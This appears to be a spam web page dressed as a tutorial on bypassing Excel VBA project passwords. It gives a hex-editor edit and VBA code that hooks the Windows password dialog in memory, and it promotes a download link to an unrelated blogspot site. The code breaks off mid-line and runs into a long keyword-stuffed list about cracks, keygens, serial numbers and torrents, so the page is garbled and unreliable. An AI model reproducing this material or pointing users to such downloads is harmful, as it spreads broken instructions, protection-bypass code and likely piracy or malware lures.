# How to Reset VBA Password in Excel Files
 
VBA (Visual Basic for Applications) is a programming language that allows you to create macros and automate tasks in Excel and other Microsoft Office applications. However, sometimes you may forget or lose the password that protects your VBA project from unauthorized access or modification. In this article, we will show you some methods to reset VBA password in Excel files using hex editor, direct VBA approach, or third-party software.
 
**DOWNLOAD ❤ [https://wahgebolbio.blogspot.com/?download=2uIFGy](https://wahgebolbio.blogspot.com/?download=2uIFGy)**


 
## Method 1: Using Hex Editor
 
A hex editor is a tool that allows you to view and edit the binary data of a file. You can use a hex editor to modify the VBA project file and remove the password protection. Here are the steps:
 
1. Make a backup copy of your Excel file that contains the locked VBA project.
2. Download and install a hex editor, such as Hex Edit (http://www.hexedit.com/).
3. Open your Excel file with the hex editor.
4. Search for the string "DPB" and replace it with "DPx".
5. Save the file and close the hex editor.
6. Open the Excel file with Excel. You may get a message box saying that there is an error in the file. Click "Yes" to continue.
7. Open the VBA editor (Alt+F11) and set a new password for your VBA project from the Project Properties dialog box.
8. Save and close the Excel file.

## Method 2: Using Direct VBA Approach
 
This method uses a VBA code that swaps the memory of the original function used to display the password dialog box with a user-defined function that always returns 1, which means the password is correct. Here are the steps:

1. Make a backup copy of your Excel file that contains the locked VBA project.
2. Create a new Excel file and insert a new module in the VBA editor.
3. Copy and paste the following code in the module, which is credited to Siwtom, a Vietnamese developer[^1^].

`Option Explicit

Private Const PAGE_EXECUTE_READWRITE = &H40

Private Declare Sub MoveMemory Lib "kernel32" Alias "RtlMoveMemory" _
(Destination As Long, Source As Long, ByVal Length As Long)

Private Declare Function VirtualProtect Lib "kernel32" (lpAddress As Long, _
ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long

Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long

Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, _
ByVal lpProcName As String) As Long

Private Declare Function DialogBoxParam Lib "user32" Alias "DialogBoxParamA" (ByVal hInstance As Long, _
ByVal pTemplateName As Long, ByVal hWndParent As Long, _
ByVal lpDialogFunc As Long, ByVal dwInitParam As Long) As Integer

Dim HookBytes(0 To 5) As Byte
Dim OriginBytes(0 To 5) As Byte
Dim pFunc As Long
Dim Flag As Boolean

Private Function GetPtr(ByVal Value As Long) As Long
GetPtr = Value
End Function

Public Sub RecoverBytes()
If Flag Then MoveMemory ByVal pFunc, ByVal VarPtr(OriginBytes(0)), 6
End Sub

Public Function Hook() As Boolean
Dim TmpBytes(0 To 5) As Byte
Dim p As Long
Dim OriginProtect As Long

Hook = False

pFunc = GetProcAddress(GetModuleHandleA("user32.dll"), "DialogBoxParamA")

If VirtualProtect(ByVal pFunc, 6, PAGE_EXECUTE_READWRITE, OriginProtect) <> 0 Then

MoveMemory ByVal VarPtr(TmpBytes(0)), ByVal pFunc, 6
If TmpBytes(0) <> &H68 Then

MoveMemory ByVal VarPtr(OriginBytes(0)), ByVal pFunc, 6

p = GetPtr(AddressOf MyDialogBoxParam)

HookBytes(0) = &H68
MoveMemory ByVal VarPtr(HookBytes(1)), ByVal Var
How to reset Vba password with serial key, 
Reset Vba password crack serial number, 
Serial number for Vba password reset tool, 
Vba password recovery serial number free, 
Reset Vba password full version serial number, 
Download reset Vba password serial number, 
Reset Vba password serial number generator, 
Reset Vba password serial number online, 
Reset Vba password license key serial number, 
Reset Vba password activation code serial number, 
Reset Vba password registration code serial number, 
Reset Vba password unlock code serial number, 
Reset Vba password product key serial number, 
Reset Vba password keygen serial number, 
Reset Vba password patch serial number, 
Reset Vba password torrent serial number, 
Reset Vba password rar serial number, 
Reset Vba password zip serial number, 
Reset Vba password exe serial number, 
Reset Vba password iso serial number, 
Reset Vba password mac serial number, 
Reset Vba password windows serial number, 
Reset Vba password linux serial number, 
Reset Vba password android serial number, 
Reset Vba password ios serial number, 
Reset Vba password software serial number, 
Reset Vba password program serial number, 
Reset Vba password application serial number, 
Reset Vba password utility serial number, 
Reset Vba password remover serial number, 
Reset Vba password breaker serial number, 
Reset Vba password bypasser serial number, 
Reset Vba password hacker serial number, 
Reset Vba password finder serial number, 
Reset Vba password retriever serial number, 
Reset Vba password extractor serial number, 
Reset Vba password changer serial number, 
Reset Vba password editor serial number, 
Reset Vba password generator serial number, 
Reset Vba password master serial number, 
Reset Vba password pro serial number, 
Reset Vba password premium serial number, 
Reset Vba password professional serial number, 
Reset Vba password ultimate serial number, 
Reset Vba password deluxe serial number, 
Reset Vba password plus serial number, 
Reset Vba password advanced serial number, 
Reset Vba password easy serial number, 
Reset Vba password simple serial number, 
Reset Vba password fast serial number 8cf37b1e13


`